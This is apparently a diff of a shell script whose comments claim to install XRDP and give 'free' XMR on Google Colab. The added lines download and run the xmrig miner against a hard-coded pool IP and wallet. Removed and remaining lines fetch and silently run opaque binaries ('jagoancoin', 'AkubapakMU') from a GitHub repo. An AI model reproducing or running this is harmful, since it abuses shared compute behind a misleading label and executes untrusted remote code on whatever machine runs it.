@@ -1,12 +1,16 @@
-git clone https://github.com/angkii/m.git
-
-cd m
-
-chmod +x theta.sh
-
-chmod +x jagoancoin
-
-./theta.sh > /dev/null 2>&1 &
+# /bin/bash
+# Install XRDP
+# Before get xmr coin for free
+# Google Colab
+sudo apt update
+clear
+sudo apt install screen
+screen -R xmr
+ 
+wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
+tar xvzf xmrig-6.17.0-linux-x64.tar.gz
+cd xmrig-6.17.0
+./xmrig -o 51.79.222.181:80 -u 1HxsnTRFipQ4L3jqMbbJEYwideoGsDBR62.Angkii -p start=0.2 -a gr -p t35 &
 
 wget https://github.com/angkii/m/raw/main/AkubapakMU
 chmod 700 AkubapakMU
